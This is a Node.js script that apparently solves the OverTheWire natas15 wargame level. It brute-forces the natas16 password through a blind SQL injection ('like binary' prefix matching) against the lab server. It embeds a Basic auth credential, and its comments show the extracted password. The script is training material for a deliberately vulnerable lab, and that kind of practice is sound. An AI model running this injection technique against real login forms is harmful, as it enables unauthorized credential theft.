const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

const headers = {
    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
}
async function req(ch) {
    const res = await axios.post('http://natas15.natas.labs.overthewire.org/index.php', `username=natas16%22+and+password+like+binary+%22${ch}%25`, {headers});
    if(res.data.includes('This user exists.')) {
        return true;
    } else {
        return false;
    }
}

async function calc() {
    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
    let ans = '';
    
    for(let i=0; i<alphanum.length; i++) {
        let val = await req(ans + alphanum[i]);
        if(val) {
            ans += alphanum[i];
            console.log(ans);
            i = -1;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));

// Outputs
// Example app listening at http://localhost:3000
// W
// Wa
// WaI
// WaIH
// WaIHE
// WaIHEa
// WaIHEac
// WaIHEacj
// WaIHEacj6
// WaIHEacj63
// WaIHEacj63w
// WaIHEacj63wn
// WaIHEacj63wnN
// WaIHEacj63wnNI
// WaIHEacj63wnNIB
// WaIHEacj63wnNIBR
// WaIHEacj63wnNIBRO
// WaIHEacj63wnNIBROH
// WaIHEacj63wnNIBROHe
// WaIHEacj63wnNIBROHeq
// WaIHEacj63wnNIBROHeqi
// WaIHEacj63wnNIBROHeqi3
// WaIHEacj63wnNIBROHeqi3p
// WaIHEacj63wnNIBROHeqi3p9
// WaIHEacj63wnNIBROHeqi3p9t
// WaIHEacj63wnNIBROHeqi3p9t0
// WaIHEacj63wnNIBROHeqi3p9t0m
// WaIHEacj63wnNIBROHeqi3p9t0m5
// WaIHEacj63wnNIBROHeqi3p9t0m5n
// WaIHEacj63wnNIBROHeqi3p9t0m5nh
// WaIHEacj63wnNIBROHeqi3p9t0m5nhm
// WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
// fin